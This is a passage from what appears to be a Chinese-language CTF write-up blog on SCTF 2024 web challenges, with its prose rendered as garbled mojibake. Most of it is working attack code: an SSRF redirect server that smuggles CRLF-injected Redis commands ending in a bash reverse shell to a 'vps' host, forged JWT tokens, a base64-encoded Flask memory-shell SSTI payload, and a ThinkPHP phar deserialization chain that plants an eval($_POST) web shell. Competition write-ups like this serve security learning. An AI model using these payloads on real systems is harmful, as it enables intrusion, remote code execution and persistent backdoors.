class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, Response, redirect<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/play&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>    <span class="hljs-comment"># CORS preflight check</span><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;HEAD&#x27;</span>:<br>        response = Response()<br>        response.headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;text/x-component&#x27;</span><br>        <span class="hljs-keyword">return</span> response<br>    <span class="hljs-comment"># after CORS preflight check</span><br>    <span class="hljs-keyword">elif</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>        ssrfUrl = <span class="hljs-string">&#x27;http://172.11.0.3:5000/&#x27;</span><br>        <span class="hljs-keyword">return</span> redirect(ssrfUrl)<br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">1717</span>, debug=<span class="hljs-literal">True</span>)<br><br></code></pre></td></tr></table></figure><p><img src="/2024/10/05/sctf-web-learning/image-20241005232229481.png" alt="image-20241005232229481"></p><p>wafè¿™é‡Œæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²é€ƒé€¸ï¼Œä¹Ÿå¾ˆç®€å•æœ‰ç°æˆè„šæœ¬ï¼Œæ‰“ä¸‹CRLFå°±å¯ä»¥äº†ã€‚</p><p>ç„¶åapp.pyæœ‰ä¸ªcurlï¼Œè™½ç„¶æŠŠgopherç»™banäº†ï¼Œä½†æ˜¯å¤§å°å†™å¯ç»•ï¼Œç»™èµµå“¥æ•´çº¢æ¸©äº†ï¼Œæˆ‘ä»¬æè¿™dict:&#x2F;&#x2F;åŠå¤©ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p><p>ç„¶åç›´æ¥æ‰“ä¸€ä¸ªä¸»ä»å°±okäº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, Response, redirect<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/play&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>    <span class="hljs-comment"># CORS preflight check</span><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;HEAD&#x27;</span>:<br>        response = Response()<br>        response.headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;text/x-component&#x27;</span><br>        <span class="hljs-keyword">return</span> response<br>    <span class="hljs-comment"># after CORS preflight check</span><br>    <span class="hljs-keyword">elif</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>        payload=<span class="hljs-string">&quot;\r\n$3\r\npun\r\n&quot;</span><span class="hljs-comment">#é—­åˆsetå‘½ä»¤</span><br>        <span class="hljs-comment">#æŒ‰ç…§ä¸‹é¢çš„å‘½ä»¤é€ä¸€æ¥</span><br>        payload+=<span class="hljs-string">&quot;config set dir /tmp\r\n&quot;</span><br>        <span class="hljs-comment"># payload+=&quot;config set dbfilename exp.so\r\n&quot;</span><br>        <span class="hljs-comment"># payload+=&quot;slaveof vps æ¶æ„redisçš„portä¹Ÿå°±æ˜¯å·¥å…·ä¸­çš„port\r\n&quot;</span><br>        <span class="hljs-comment"># payload+=&quot;module load /tmp/exp.so&quot;</span><br>        payload+=<span class="hljs-string">&quot;system.exec &#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/vps/åå¼¹shellçš„port 0&gt;&amp;1\&quot;&#x27;\r\n&quot;</span><br>        exp=<span class="hljs-string">&quot;admin&quot;</span>*<span class="hljs-built_in">len</span>(payload)+payload<br>        ssrfUrl = <span class="hljs-string">f&#x27;http://172.11.0.3:5000/login?username=<span class="hljs-subst">&#123;quote(exp)&#125;</span>&amp;&amp;password=1&#x27;</span><br>        <span class="hljs-keyword">return</span> redirect(ssrfUrl)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">1717</span>, debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>æˆ–è€…ç”¨èƒ½ç›´æ¥system.revçš„soæ–‡ä»¶ã€‚éš¾ç»·çš„æ˜¯æ‰“ä¸€æ¬¡å°±è¦æ”¹ä¸€æ¬¡æ–‡ä»¶é‡æ–°æ”¾æœåŠ¡ç„¶åé‡æ–°å‘åŒ…ï¼ŒæŒºç¹ççš„ã€‚æŠ˜ç£¨æˆ‘ä»¬åŠå¤©çš„æ‰çº¿é—®é¢˜è¿˜çœŸå°±å‡ºåœ¨soæ–‡ä»¶ä¸Šã€‚</p><p><img src="/2024/10/05/sctf-web-learning/image-20241005232541594.png" alt="image-20241005232541594"></p><h2 id="ezRender"><a href="#ezRender" class="headerlink" title="ezRender"></a>ezRender</h2><p>ä»¥å‰æ²¡è§è¿‡ï¼Œä½†æ˜¯é˜Ÿé‡Œèµ›æ£å­¦é•¿è§è¿‡ã€‚</p><p>è¿˜çœŸå°±æ˜¯æ‰“ulimitã€‚</p><p>ä»–ç”Ÿæˆjwtç”¨åˆ°äº†&#x2F;dev&#x2F;randomå’Œæ—¶é—´æˆ³ï¼Œè¿™é‡Œhintç»™äº†<strong>ulimit -n &#x3D; 2048</strong></p><p>è¯´äººè¯å°±æ˜¯åŒæ—¶å…è®¸æœ€å¤§æ‰“å¼€2048ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼ˆæ–‡ä»¶ã€å¥—æ¥å­—ç­‰ï¼‰ï¼Œå¦‚æœè¿›ç¨‹åˆ°äº†é™åˆ¶å°±ä¼šæŠ¥é”™ã€‚</p><p>é‚£ä¹ˆæˆ‘æ³¨å†Œ2048ä¸ªè´¦å·åï¼Œä»–è¿™ä¸ª&#x2F;dev&#x2F;ramdomå°±ä¼šå› ä¸ºè¿™ä¸ªé™åˆ¶æ‰“ä¸å¼€äº†ï¼Œæ‰€ä»¥jwtçš„å¯†é’¥å°±å‰©ä¸‹10ä½çš„æ—¶é—´æˆ³äº†ã€‚</p><p>å€Ÿç”¨<a href="https://blog.xmcve.com/2024/10/01/SCTF-2024-Writeup/#title-18">SCTF 2024 Writeup - æ˜Ÿç›Ÿå®‰å…¨å›¢é˜Ÿ (xmcve.com)</a></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/register</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>124.220.229.60:8080<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://124.220.229.60:8080/register<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>42<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://124.220.229.60:8080<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;adminÂ§1Â§&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin123&quot;</span><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure><p>å‘åŒ…2048ä¸ªä»¥ä¸Šã€‚</p><p>time_string ä¸ºadmin2060æ—¶æœåŠ¡å™¨è¿”å›çš„æ—¶é—´æˆ³</p><p>æ„é€ ä¸€æ‰‹tokenï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><br><span class="hljs-comment"># æŒ‡å®šæ—¶é—´å­—ç¬¦ä¸²</span><br>time_string = <span class="hljs-string">&quot;Sun, 29 Sep 2024 06:03:45 GMT&quot;</span>  <br><br><span class="hljs-comment"># è½¬æ¢ä¸ºæ—¶é—´æˆ³</span><br>timestamp = <span class="hljs-built_in">int</span>(time.mktime(time.strptime(time_string, <span class="hljs-string">&quot;%a, %d %b %Y %H:%M:%S %Z&quot;</span>)))<br><br><span class="hljs-comment"># æ‰“å°æ—¶é—´æˆ³</span><br><span class="hljs-built_in">print</span>(timestamp) <br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> jwt<br><span class="hljs-keyword">from</span> app <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> User <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generateToken</span>(<span class="hljs-params">user</span>):<br>    secret=&#123;<span class="hljs-string">&quot;name&quot;</span>:user,<span class="hljs-string">&quot;is_admin&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>&#125;<br>    <br>    verify_c=jwt.encode(secret, secret_key, algorithm=<span class="hljs-string">&#x27;HS256&#x27;</span>)<br>    infor=&#123;<span class="hljs-string">&quot;name&quot;</span>:user,<span class="hljs-string">&quot;secret&quot;</span>:verify_c&#125;<br>    token=base64.b64encode(json.dumps(infor).encode()).decode()<br>    <span class="hljs-built_in">print</span>(infor)<br>    <span class="hljs-built_in">print</span>(token)<br><br><br>secret_key=<span class="hljs-string">&quot;1727589825&quot;</span><br>generateToken(<span class="hljs-string">&#x27;admin2060&#x27;</span>)<br></code></pre></td></tr></table></figure><p>ç„¶åæ¢æ‰cookieï¼Œåˆ é™¤éƒ¨åˆ†ç”¨æˆ·ä½¿å­˜åœ¨ç”¨æˆ·å°‘äº2048ä¸ªï¼ŒæœåŠ¡æ­£å¸¸ã€‚</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/removeUser</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>1.95.40.5:29351<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Token=eyJuYW1lIjogImFkbWluMjA2MCIsICJzZWNyZXQiOiAiZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SnVZVzFsSWpvaVlXUnRhVzR5TURZd0lpd2lhWE5mWVdSdGFXNGlPaUl4SW4wLi1maGFqQ1M4S1RfMDY2YWlxSmhqNGxHcHdVdWRMbFprMnh1SlFxUld2Q0kifQ==<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://124.220.229.60:8080/register<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>15<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://124.220.229.60:8080<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0<br><br><span class="language-abnf"><span class="hljs-attribute">username</span><span class="hljs-operator">=</span>adminÂ§<span class="hljs-number">1</span>Â§</span><br></code></pre></td></tr></table></figure><p>codeä¼ å‚ç›´æ¥æ‰“å…¥flaskå†…å­˜é©¬ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/admin</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>1.95.40.5:29351<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://124.220.229.60:8080/register<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Token=eyJuYW1lIjogImFkbWluMjA2MCIsICJzZWNyZXQiOiAiZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SnVZVzFsSWpvaVlXUnRhVzR5TURZd0lpd2lhWE5mWVdSdGFXNGlPaUl4SW4wLi1maGFqQ1M4S1RfMDY2YWlxSmhqNGxHcHdVdWRMbFprMnh1SlFxUld2Q0kifQ==<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>323<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://124.220.229.60:8080<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0<br><br><span class="language-handlebars"><span class="language-xml">code=</span><span class="hljs-template-variable">&#123;&#123;(<span class="hljs-name">g.pop.__globals__.__builtins__.__getitem__</span>(<span class="hljs-name">&#x27;EXEC&#x27;.lower</span>()))(<span class="hljs-name">&quot;import+base64;ex&quot;</span>%<span class="hljs-number">2</span>b<span class="hljs-string">&quot;ec(base64.b64decode(&#x27;X19pbXBvcnRfXygnc3lzJykubW9kdWxlc1snX19tYWluX18nXS5fX2RpY3RfX1snYXBwJ10uYmVmb3JlX3JlcXVlc3RfZnVuY3Muc2V0ZGVmYXVsdChOb25lLFtdKS5hcHBlbmQobGFtYmRhIDpfX2ltcG9ydF9fKCdvcycpLnBvcGVuKCcvcmVhZGZsYWcnKS5yZWFkKCkp&#x27;));&quot;</span>)&#125;&#125;</span></span><br></code></pre></td></tr></table></figure><p><img src="/2024/10/05/sctf-web-learning/image-20241005233349472.png" alt="image-20241005233349472"></p><h2 id="Simpleshop"><a href="#Simpleshop" class="headerlink" title="Simpleshop"></a>Simpleshop</h2><p>çœ‹äº†ä¸€åŠæ²¡çœ‹åˆ°ã€‚</p><p>çœ‹äº†ä»–çš„letterï¼Œæ³¨å†Œäº†ä¸ªå·ï¼Œä¿®æ”¹å¤´åƒå¤„å­˜åœ¨æ–‡ä»¶ä¸Šä¼ ï¼Œä½†æ˜¯ç›´æ¥ä¼ ä¸è¡Œï¼Œbanå®Œäº†ã€‚</p><p>ä¸‹è½½æºç å‘ç°ThinkPHPæ¡†æ¶ï¼Œå¹¶ä¸”æ‰¾åˆ°ä¸ªæœªå…¬å¼€çš„CVEæ‰“è¿™ä¸ªCRMEBçš„ååºåˆ—åŒ–ï¼ŒæŒ–æ´æ²¡è·‘äº†ã€‚</p><p>æƒ³åŠæ³•æ‰“pharå§ã€‚</p><p>æ¼æ´ç‚¹åœ¨<code>CRMEB-5.4.0\CRMEB-5.4.0\crmeb\app\adminapi\controller</code>çš„<code>PublicController</code>ç±»ä¸­ã€‚</p><p>ç½‘ä¸Šæ‰¾ThinkPHPçš„ååºåˆ—åŒ–é“¾ï¼Œæœ‰ç°æˆçš„ï¼Œç›´æ¥å¥—è¿‡æ¥ç”¨ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">PhpOffice</span>\<span class="hljs-title class_">PhpSpreadsheet</span>\<span class="hljs-title class_">Collection</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">Cells</span>&#123;<br>        <span class="hljs-title class_">private</span> $<span class="hljs-title class_">cache</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$exp</span></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;cache = <span class="hljs-variable">$exp</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">log</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">Channel</span>&#123;<br>        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">logger</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$lazy</span> = <span class="hljs-literal">true</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$exp</span></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;logger = <span class="hljs-variable">$exp</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;lazy = <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">Request</span>&#123;<br>        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">url</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;url = <span class="hljs-string">&#x27;&lt;?php file_put_contents(&quot;/var/www/public/uploads/store/comment/20240929/fpclose.php&quot;, \&#x27;&lt;?php eval($_POST[1]); ?&gt;\&#x27;, FILE_APPEND); ?&gt;&#x27;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">App</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$instances</span> = [];<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;instances = [<span class="hljs-string">&#x27;think\Request&#x27;</span>=&gt;<span class="hljs-keyword">new</span> <span class="hljs-title class_">Request</span>()];<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">view</span>\<span class="hljs-title class_">driver</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">Php</span>&#123;&#125;<br>&#125;<br><br><span class="hljs-title class_">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">log</span>\<span class="hljs-title class_">driver</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">Socket</span>&#123;<br>        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">config</span> = [];<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$app</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>            <span class="hljs-variable language_">$this</span>-&gt;config = [<br>                <span class="hljs-string">&#x27;debug&#x27;</span>=&gt;<span class="hljs-literal">true</span>,<br>                <span class="hljs-string">&#x27;force_client_ids&#x27;</span> =&gt; <span class="hljs-number">1</span>,<br>                <span class="hljs-string">&#x27;allow_client_ids&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>                <span class="hljs-string">&#x27;format_head&#x27;</span> =&gt; [<span class="hljs-keyword">new</span> \think\view\driver\Php,<span class="hljs-string">&#x27;display&#x27;</span>],<br>            ];<br>            <span class="hljs-variable language_">$this</span>-&gt;app = <span class="hljs-keyword">new</span> \think\<span class="hljs-title function_ invoke__">App</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> &#123;<br>    $<span class="hljs-title class_">c</span> = <span class="hljs-title class_">new</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">log</span>\<span class="hljs-title class_">driver</span>\<span class="hljs-title class_">Socket</span>();<br>    <span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> think\log\<span class="hljs-title function_ invoke__">Channel</span>(<span class="hljs-variable">$c</span>);<br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PhpOffice\PhpSpreadsheet\Collection\Cells</span>(<span class="hljs-variable">$b</span>);<br><br><br>    <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;phar.readonly&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;1.phar&#x27;</span>);<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;fpclose.jpg&quot;</span>, <span class="hljs-string">&quot;666&quot;</span>);<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>phar://</code>è¢«banäº†ï¼Œè¿™ä¸ªçœ‹äº†æºç å‘ç°å…¶å®æ˜¯ç›´æ¥è¢«æ›¿æ¢ä¸ºç©ºï¼ŒåŒå†™å°±èƒ½ç»•è¿‡ã€‚</p><p>æ–‡ä»¶ç›´æ¥å¥—ä¸€ä¸ªgzipæ¥ç»•ä¸Šä¼ å†…å®¹æ£€æµ‹ã€‚å…ˆæ”¹å1.jpgç„¶ågzip 1.jpgã€‚</p><p><img src="/2024/10/05/sctf-web-learning/image-20241005233834211.png" alt="image-20241005233834211"></p><p>èšå‰‘ç›´è¿ï¼Œç”¨ä¸€ä¸‹fpmæ’ä»¶ç»•è¿‡disable_functionsã€‚</p><p><img src="/2024/10/05/sctf-web-learning/image-20241005233935015.png" alt="image-20241005233935015"></p><p>ç„¶åé‡Œé¢ä¸€ä¸ªsuid-grepææƒäº¤äº†ã€‚</p><p>è¿™é‡Œç¿»ç½‘ä¸Šwpå‘ç°æ˜Ÿç›Ÿè¿˜çœŸnbï¼Œå†™äº†ä¸ªè·³æ¿phpï¼Œç„¶åæ‰“iconvæ¥getshellï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&#x27;img&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;img&#x27;</span>);<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ 